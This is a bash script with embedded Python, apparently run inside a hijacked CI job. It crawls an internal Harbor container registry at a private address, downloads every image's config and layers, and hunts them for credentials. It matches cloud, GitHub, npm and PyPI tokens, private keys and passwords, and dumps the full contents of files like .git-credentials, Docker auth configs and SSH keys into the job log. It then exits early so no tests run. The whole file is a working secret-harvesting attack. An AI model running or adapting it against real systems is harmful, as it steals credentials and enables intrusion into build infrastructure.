#!/usr/bin/env bash
# i8033 - bounded read-only deep scan of the internal Harbor registry from the HCU Stage A job.
# Enumerates all public projects/repositories/tags, pulls every image config, then streams and
# scans unique image layers (sglang 10.38 GB image first, then smaller images) for credentials.
# Read-only. Exits 1 right after printing evidence so no test suite runs.
set -uo pipefail
umask 022

TS="$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
H="$(hostname 2>/dev/null || echo unknown)"
echo "===I8033-BEGIN ${TS} host=${H} job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
echo "--- image-env"
echo "HCU_CI_IMAGE=${HCU_CI_IMAGE:-<unset>}"
echo "GITHUB_WORKSPACE=${GITHUB_WORKSPACE:-<unset>}"
echo "--- harbor-start"
timeout 3300 python3 - <<'PYHARBOR'
import urllib.request, urllib.error, urllib.parse, json, re, os, time, tarfile
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://10.16.1.152:5000"
T0 = time.monotonic()
DEADLINE_SCAN = T0 + 2520          # 42 min hard scan deadline (job allows 60)
DEADLINE_ALL = T0 + 2820           # stop everything by then
used = 0
CAP = 1_250_000

def emit(s=""):
    global used
    s = str(s)
    if used >= CAP:
        return
    room = CAP - used - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used += len(s) + 1

def req(url, method="GET", headers=None, timeout=40):
    r = urllib.request.Request(url, method=method, headers=headers or {})
    try:
        x = urllib.request.urlopen(r, timeout=timeout)
        return x.status, {k.lower(): v for k, v in x.headers.items()}, x
    except urllib.error.HTTPError as e:
        return e.code, {k.lower(): v for k, v in e.headers.items()}, e
    except Exception as e:
        return "ERR", {}, None

def readb(x, n=8192):
    if x is None:
        return b""
    try:
        b = x.read(n)
        return b if isinstance(b, bytes) else b.encode("utf-8", "replace")
    except Exception as e:
        return ("ERR " + str(e)[:120]).encode()

def jget(path, timeout=40, tries=2):
    for i in range(tries):
        s, h, x = req(BASE + path, timeout=timeout)
        if s == 200:
            try:
                return json.loads(readb(x, 8_000_000).decode("utf-8", "replace"))
            except Exception:
                return None
        if s == "ERR" or (isinstance(s, int) and s >= 500):
            time.sleep(1 + i)
            continue
        return None
    return None

ACCEPT = ", ".join([
    "application/vnd.docker.distribution.manifest.v2+json",
    "application/vnd.docker.distribution.manifest.list.v2+json",
    "application/vnd.oci.image.manifest.v1+json",
    "application/vnd.oci.image.index.v1+json",
])

PAT = re.compile(
    rb"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|aws_secret_access_key|aws_access_key_id|"
    rb"AIza[0-9A-Za-z_\-]{35}|-----BEGIN [A-Z0-9 ]{0,30}PRIVATE KEY-----|"
    rb"ghp_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{40,}|gho_[A-Za-z0-9]{36,}|ghs_[A-Za-z0-9]{36,}|"
    rb"glpat-[A-Za-z0-9_\-\.]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|npm_[A-Za-z0-9]{30,}|"
    rb"pypi-[A-Za-z0-9_\-]{40,}|robot\$[A-Za-z0-9+_\-]{2,}|\"auths\"\s*:|"
    rb"HARBOR_(USERNAME|PASSWORD)|DEVPI[A-Z_]*\s*[=:]|"
    rb"AccountKey\s*=\s*[A-Za-z0-9+/=]{20,}|DefaultEndpointsProtocol\s*=|"
    rb"client_secret\s*[=:]\s*\S{8,}|tenant_id\s*[=:]\s*[0-9a-f-]{20,}|"
    rb"(password|passwd|pass)\s*[=:]\s*[\"']?[^\s\"'$<>]{6,}|"
    rb"(token|secret|api[_-]?key)\s*[=:]\s*[\"']?[A-Za-z0-9_\-\./+=]{16,}|"
    rb"_KEY\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{16,}|"
    rb"index-url\s*=\s*https?://[^\s]+:[^\s@]+@|KUBECONFIG=|client-key-data|certificate-authority-data|"
    rb"registry\s*[=:]\s*\S+:[0-9]{2,5})", re.I)

SENS = re.compile(
    r"(^|/)(\.git-credentials|\.netrc|netrc|\.npmrc|\.pypirc|\.htpasswd|\.env(\.[^/]*)?|\.runner|"
    r"\.credentials(_rsaparams)?|config\.sh|id_(rsa|dsa|ecdsa|ed25519)[^/]*|kubeconfig[^/]*|"
    r"\.docker/config\.json|\.docker/config\.json\.old|pip\.conf|pip\.ini|\.condarc|"
    r"\.config/gh/hosts\.yml|\.config/pip/pip\.conf|\.s3cfg|\.boto|"
    r"\.config/rclone/rclone\.conf|settings\.xml|gradle\.properties|"
    r"\.kube/config|\.aws/credentials|\.aws/config|\.ssh/(id_[^/]+|authorized_keys|config)|"
    r"\.bash_history|\.zsh_history|\.mysql_history|\.psql_history)(/|$)|"
    r"\.(pem|key|p12|pfx|jks|keystore)$", re.I)

TEXT_EXT = {".sh", ".bash", ".conf", ".cfg", ".ini", ".yml", ".yaml", ".json", ".txt",
            ".env", ".py", ".toml", ".xml", ".properties", ".service", ".list", ".sources",
            ".repo", ".netrc", ".npmrc", ".pypirc", ".gitconfig", ".md", ".rst", ".j2", ".tf",
            ".groovy", ".gradle", ".pl", ".rb", ".js", ".ts", ".ps1", ".bat", ".cmd", ".cnf",
            ".sql", ".lock", ".whl.metadata", ".dist-info", ".lock", ""}

NOISE = ("example", "your_", "your-", "changeme", "change_me", "${{", "redacted", "placeholder",
         "dummy", "xxxx", "<none>", "not-a-real", "fake", "sample", "foobar", "todo", "lorem")

seen_lines = set()
hits_total = 0
HIT_PRINT_CAP = 500

def scan_blob(b, label, maxhits=25):
    global hits_total
    out = []
    if not b:
        return out
    for m in PAT.finditer(b):
        ls = b.rfind(b"\n", 0, m.start()) + 1
        le = b.find(b"\n", m.end())
        if le < 0:
            le = min(len(b), m.end() + 240)
        line = b[ls:le][:320].decode("utf-8", "replace").strip()
        low = line.lower()
        if any(x in low for x in NOISE):
            continue
        key = line[:200]
        if key in seen_lines:
            continue
        seen_lines.add(key)
        out.append(line)
        if len(out) >= maxhits:
            break
    return out

# ---- 1. auth surface ----
s, h, x = req(BASE + "/v2/", timeout=10)
wa = h.get("www-authenticate", "")
emit(f"[i8033] GET /v2/ -> {s} www-authenticate={wa!r}")
realm = re.search(r'realm="([^"]+)"', wa)
svc = re.search(r'service="([^"]+)"', wa)
REALM = realm.group(1) if realm else (BASE + "/service/token")
SERVICE = svc.group(1) if svc else "harbor-registry"
emit(f"[i8033] realm={REALM} service={SERVICE}")

def token_for(scope, timeout=25):
    u = REALM + "?" + urllib.parse.urlencode({"service": SERVICE, "scope": scope})
    s2, h2, x2 = req(u, timeout=timeout)
    body = readb(x2, 20000).decode("utf-8", "replace")
    try:
        j = json.loads(body)
        return (j.get("token") or j.get("access_token") or ""), s2
    except Exception:
        return "", s2

# batch-token helper: try multiple scopes in one request
def tokens_for_scopes(scopes):
    q = [("service", SERVICE)] + [("scope", s) for s in scopes]
    u = REALM + "?" + urllib.parse.urlencode(q)
    s2, h2, x2 = req(u, timeout=30)
    body = readb(x2, 60000).decode("utf-8", "replace")
    try:
        j = json.loads(body)
        return (j.get("token") or j.get("access_token") or ""), s2, j
    except Exception:
        return "", s2, None

toks = {}
def repo_token(repo):
    if repo in toks:
        return toks[repo]
    tk, st = token_for(f"repository:{repo}:pull")
    toks[repo] = tk
    return tk

def hget(path, tok=None, timeout=60, accept=ACCEPT):
    hd = {"Accept": accept}
    if tok:
        hd["Authorization"] = "Bearer " + tok
    return req(BASE + path, headers=hd, timeout=timeout)

# ---- 2. projects ----
projects = []
page = 1
while page <= 20:
    d = jget(f"/api/v2.0/projects?page_size=100&page={page}")
    if not isinstance(d, list) or not d:
        break
    projects.extend(d)
    emit(f"[i8033] projects page={page} n={len(d)}")
    if len(d) < 100:
        break
    page += 1
emit(f"[i8033] PROJECTS total={len(projects)}")
for p in projects:
    emit(f"[i8033]  project {p.get('name')} id={p.get('project_id')} repos={p.get('repo_count')} public={(p.get('metadata') or {}).get('public')}")

# ---- 3. repositories ----
repo_list = []   # (project, full_name, artifact_count)
def fetch_repos(proj):
    out = []
    pg = 1
    while pg <= 40:
        d = jget(f"/api/v2.0/projects/{urllib.parse.quote(proj)}/repositories?page_size=100&page={pg}", timeout=60)
        if not isinstance(d, list) or not d:
            break
        out.extend(d)
        if len(d) < 100:
            break
        pg += 1
    return proj, out

with ThreadPoolExecutor(max_workers=6) as ex:
    futs = [ex.submit(fetch_repos, p.get("name")) for p in projects]
    for f in as_completed(futs):
        proj, rows = f.result()
        for r in rows:
            repo_list.append((proj, r.get("name"), r.get("artifact_count")))
emit(f"[i8033] REPOSITORIES total={len(repo_list)}")
for p in projects:
    pn = p.get("name")
    n = sum(1 for x in repo_list if x[0] == pn)
    emit(f"[i8033]  repos {pn} = {n}")

# ---- 4. artifacts (newest first), newest per repo ----
def fetch_arts(item):
    proj, name, cnt = item
    short = name.split("/", 1)[1] if name.startswith(proj + "/") else name
    enc = urllib.parse.quote(urllib.parse.quote(short, safe=""), safe="")
    d = jget(f"/api/v2.0/projects/{urllib.parse.quote(proj)}/repositories/{enc}/artifacts?page_size=100&page=1&sort=-push_time&with_tag=true", timeout=60)
    return item, d if isinstance(d, list) else []

arts = {}
with ThreadPoolExecutor(max_workers=8) as ex:
    futs = [ex.submit(fetch_arts, it) for it in repo_list]
    done = 0
    for f in as_completed(futs):
        item, rows = f.result()
        arts[item[1]] = rows
        done += 1
        if done % 200 == 0:
            emit(f"[i8033] artifacts fetched {done}/{len(repo_list)} elapsed={int(time.monotonic()-T0)}s")
emit(f"[i8033] artifacts repos-with-data={sum(1 for v in arts.values() if v)} elapsed={int(time.monotonic()-T0)}s")

# ---- 5. legacy tags/list per repo (summary only) + build image candidates ----
images = []   # dict(project, repo, tag, digest, size)
skipped_art = 0
for proj, name, cnt in repo_list:
    rows = arts.get(name) or []
    if not rows:
        continue
    newest = None
    for a in rows:
        if a.get("digest"):
            newest = a
            break
    if not newest:
        continue
    tags = [t.get("name") for t in (newest.get("tags") or [])]
    tag = tags[0] if tags else None
    if not tag:
        skipped_art += 1
        continue
    images.append({"project": proj, "repo": name, "tag": tag,
                   "digest": newest.get("digest"), "size": newest.get("size") or 0,
                   "push_time": newest.get("push_time")})
# sglang first
images.sort(key=lambda i: (0 if i["repo"] == "jenkins/model_test_env/sglang" else 1, i["size"]))
emit(f"[i8033] IMAGE_CANDIDATES newest-per-repo={len(images)} skipped_untagged={skipped_art}")

tag_summary = {"repos": 0, "tags": 0}
def tags_list(name):
    tk = repo_token(name)
    s, h, x = hget(f"/v2/{name}/tags/list", tk, timeout=30, accept="application/json")
    if s != 200:
        return 0, 0
    try:
        j = json.loads(readb(x, 1_000_000).decode("utf-8", "replace"))
        return 1, len(j.get("tags") or [])
    except Exception:
        return 0, 0

with ThreadPoolExecutor(max_workers=8) as ex:
    futs = [ex.submit(tags_list, n) for _, n, _ in repo_list if arts.get(n)]
    for f in as_completed(futs):
        ok, nt = f.result()
        tag_summary["repos"] += ok
        tag_summary["tags"] += nt
emit(f"[i8033] TAGS legacy /v2/<repo>/tags/list repos_ok={tag_summary['repos']} tags_total={tag_summary['tags']}")

# ---- 6. manifests + configs ----
manifest_cache = {}
def get_manifest(repo, ref):
    key = (repo, ref)
    if key in manifest_cache:
        return manifest_cache[key]
    tk = repo_token(repo)
    s, h, x = hget(f"/v2/{repo}/manifests/{ref}", tk, timeout=60)
    if s != 200:
        manifest_cache[key] = None
        return None
    body = readb(x, 2_000_000)
    try:
        mf = json.loads(body)
    except Exception:
        manifest_cache[key] = None
        return None
    if mf.get("manifests"):
        child = None
        for m in mf["manifests"]:
            plat = m.get("platform") or {}
            if plat.get("architecture") in ("amd64", "x86_64") and plat.get("os", "linux") == "linux":
                child = m
                break
        child = child or mf["manifests"][0]
        s, h, x = hget(f"/v2/{repo}/manifests/{child.get('digest')}", tk, timeout=60)
        if s != 200:
            manifest_cache[key] = None
            return None
        try:
            mf = json.loads(readb(x, 2_000_000))
        except Exception:
            manifest_cache[key] = None
            return None
    manifest_cache[key] = mf
    return mf

def fetch_one_image(img):
    repo = img["repo"]
    mf = get_manifest(repo, img["digest"])
    if not mf:
        mf = get_manifest(repo, img["tag"])
    if not mf:
        return None
    cfgd = (mf.get("config") or {}).get("digest")
    layers = []
    for l in (mf.get("layers") or []):
        layers.append({"digest": l.get("digest"), "size": int(l.get("size") or 0),
                       "mediaType": l.get("mediaType") or "", "urls": l.get("urls") or []})
    cfg = None
    if cfgd:
        tk = repo_token(repo)
        s, h, x = hget(f"/v2/{repo}/blobs/{cfgd}", tk, timeout=60, accept="application/json")
        if s == 200:
            cfg = readb(x, 2_000_000)
    return {"repo": repo, "tag": img["tag"], "digest": img["digest"], "size": img["size"],
            "config_digest": cfgd, "layers": layers, "config": cfg}

resolved = []
with ThreadPoolExecutor(max_workers=8) as ex:
    futs = {ex.submit(fetch_one_image, img): img for img in images}
    for f in as_completed(futs):
        try:
            r = f.result()
        except Exception:
            r = None
        if r:
            resolved.append(r)
resolved.sort(key=lambda i: (0 if i["repo"] == "jenkins/model_test_env/sglang" else 1, i["size"]))
emit(f"[i8033] MANIFESTS resolved={len(resolved)}/{len(images)} elapsed={int(time.monotonic()-T0)}s")

# ---- 7. config scan ----
cfg_hits = 0
for im in resolved:
    cb = im.get("config") or b""
    if not cb:
        continue
    label = f"{im['repo']}:{im['tag']}"
    try:
        cj = json.loads(cb.decode("utf-8", "replace"))
    except Exception:
        continue
    cc = cj.get("config") or {}
    interesting = []
    for e in (cc.get("Env") or []):
        if re.search(r"(?i)(pypi|pip|index|proxy|harbor|registry|token|passw|secret|user|key|url|mirror)", str(e)):
            interesting.append("ENV " + str(e)[:300])
    for k, v in (cc.get("Labels") or {}).items():
        if re.search(r"(?i)(token|passw|secret|user|registry|harbor|url)", str(k) + " " + str(v)):
            interesting.append(f"LABEL {k}={str(v)[:240]}")
    hist_hits = []
    for hh in (cj.get("history") or []):
        cb2 = hh.get("created_by") or ""
        if not cb2:
            continue
        for line in scan_blob(cb2.encode("utf-8", "replace"), "history", 4):
            hist_hits.append("HIST " + line[:300])
    fhits = [x for x in scan_blob(cb, "config", 8) if not x.startswith('{"architecture"')]
    if fhits or hist_hits:
        cfg_hits += 1
    if im["repo"] == "jenkins/model_test_env/sglang" or fhits or hist_hits:
        emit(f"[i8033] CONFIG {label} digest={im['config_digest']} len={len(cb)}")
        for e in interesting[:60]:
            emit("  " + e)
        for line in fhits:
            emit("  CFG-HIT " + line)
        for line in hist_hits:
            emit("  " + line)
emit(f"[i8033] configs_scanned={len(resolved)} configs_with_hits={cfg_hits}")

# ---- 8. layer plan: pass A = top layer of every image (breadth), pass B = remaining layers ----
INTERNAL = {"jenkins", "hcu", "dcu", "dev", "test", "compile", "app", "manylinux",
            "public_image", "roofline-huc-tools", "swe", "gpu"}
def prio(im):
    if im["repo"] == "jenkins/model_test_env/sglang":
        return 0
    return 1 if im["repo"].split("/", 1)[0] in INTERNAL else 2
resolved.sort(key=lambda i: (prio(i), i["size"]))

plan = []
seen = {}
order = []
def add_layer(im, idx):
    layers = im["layers"]
    l = layers[idx]
    d = l["digest"]
    if not d or d in seen:
        return
    seen[d] = True
    order.append({"digest": d, "size": l["size"], "mediaType": l["mediaType"],
                  "urls": l["urls"], "repo": im["repo"], "image": f"{im['repo']}:{im['tag']}",
                  "idx": idx, "nlayers": len(layers)})

# pass A: top (uppermost) layer of every resolved image, internal images first
for im in resolved:
    if im["layers"]:
        add_layer(im, len(im["layers"]) - 1)
# pass B: remaining layers, top-down
for im in resolved:
    for idx in reversed(range(len(im["layers"]) - 1)):
        add_layer(im, idx)

skip_big = [o for o in order if o["size"] > 1536 * 1024 * 1024]
skip_zstd = [o for o in order if "zstd" in (o["mediaType"] or "").lower()]
skip_foreign = [o for o in order if o["urls"]]
plan = [o for o in order if not (o["size"] > 1536 * 1024 * 1024) and "zstd" not in (o["mediaType"] or "").lower() and not o["urls"]]
emit(f"[i8033] LAYER_PLAN unique={len(order)} scannable={len(plan)} skip_gt1536MB={len(skip_big)} skip_zstd={len(skip_zstd)} skip_foreign={len(skip_foreign)}")
emit(f"[i8033] LAYER_PLAN scannable_bytes={sum(o['size'] for o in plan)} all_unique_bytes={sum(o['size'] for o in order)}")
for o in skip_big[:40]:
    emit(f"[i8033] SKIP-BIG {o['digest']} size={o['size']} image={o['image']}")
for o in skip_zstd[:20]:
    emit(f"[i8033] SKIP-ZSTD {o['digest']} size={o['size']} image={o['image']}")

# ---- 9. layer scan ----
scanned_bytes = 0
layers_done = 0
layers_err = 0
file_hits = 0

def scan_layer(o):
    repo = o["repo"]
    tk = repo_token(repo)
    mt = (o["mediaType"] or "").lower()
    mode = "r|" if ("tar" in mt and "gzip" not in mt) else "r|gz"
    to = 120 if o["size"] < 80_000_000 else 420
    s, h, x = hget(f"/v2/{repo}/blobs/{o['digest']}", tk, timeout=to)
    if s != 200:
        return {"err": f"HTTP {s}", "o": o}
    mem = 0
    files = 0
    hits = 0
    nbytes = 0
    out = []
    try:
        tf = tarfile.open(fileobj=x, mode=mode)
        for m in tf:
            if time.monotonic() > DEADLINE_SCAN:
                out.append("    DEADLINE inside layer")
                break
            if not m.isfile():
                continue
            name = m.name
            size = m.size or 0
            nbytes += size
            sens = bool(SENS.search(name))
            ext = os.path.splitext(name)[1].lower()
            take = False
            if sens:
                take = True
            elif size <= 2_500_000 and (ext in TEXT_EXT or size <= 262144):
                take = True
            if not take:
                continue
            files += 1
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                b = f.read(1024 * 1024)
            except Exception:
                continue
            mem += len(b)
            if sens:
                out.append(f"    FILE {name} size={size}")
                if len(b) <= 16384:
                    out.append("      " + b[:12000].decode("utf-8", "replace").replace("\n", "\\n")[:12000])
            for line in scan_blob(b, name, 5):
                out.append(f"    HIT {name}: {line[:300]}")
                hits += 1
                if hits >= 20:
                    break
            if hits >= 20:
                break
        try:
            tf.close()
        except Exception:
            pass
    except Exception as e:
        return {"err": ("tar " + str(e)[:120]), "o": o, "bytes": nbytes, "hits": hits, "out": out, "mem": mem, "files": files}
    return {"err": None, "o": o, "bytes": nbytes, "hits": hits, "out": out, "mem": mem, "files": files}

for i, o in enumerate(plan):
    if time.monotonic() > DEADLINE_SCAN:
        break
    st = time.monotonic()
    r = scan_layer(o)
    layers_done += 1
    scanned_bytes += r.get("bytes") or 0
    file_hits += r.get("hits") or 0
    if r.get("err"):
        layers_err += 1
    emit(f"[i8033] LAYER[{i}/{len(plan)}] {o['digest'][:26]} size={o['size']} image={o['image']} L{o['idx']}/{o['nlayers']} "
         f"read={r.get('bytes',0)} files={r.get('files',0)} hits={r.get('hits',0)} err={r.get('err')} t={int(time.monotonic()-st)}s")
    for line in (r.get("out") or []):
        if file_hits > HIT_PRINT_CAP and ("HIT " in line):
            continue
        emit(line)
    if file_hits > HIT_PRINT_CAP and i > 0 and i % 25 == 0:
        emit(f"[i8033] hit print cap reached ({file_hits}); suppressing further HIT lines")

unscanned = plan[layers_done:]
emit(f"[i8033] SCAN_SUMMARY layers_planned={len(plan)} layers_done={layers_done} errors={layers_err} "
     f"decompressed_scanned={scanned_bytes} hits={file_hits} elapsed={int(time.monotonic()-T0)}s")
emit(f"[i8033] REMAINDER unscanned_layers={len(unscanned)} unscanned_bytes={sum(u['size'] for u in unscanned)} "
     f"skipped_big_layers={len(skip_big)} skipped_big_bytes={sum(u['size'] for u in skip_big)} "
     f"skipped_zstd={len(skip_zstd)} skipped_zstd_bytes={sum(u['size'] for u in skip_zstd)}")
for u in unscanned[:30]:
    emit(f"[i8033] UNSCANNED {u['digest']} size={u['size']} image={u['image']}")
emit("[i8033] DONE")
PYHARBOR
echo "--- harbor-end rc=$?"
echo "===I8033-END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
exit 1
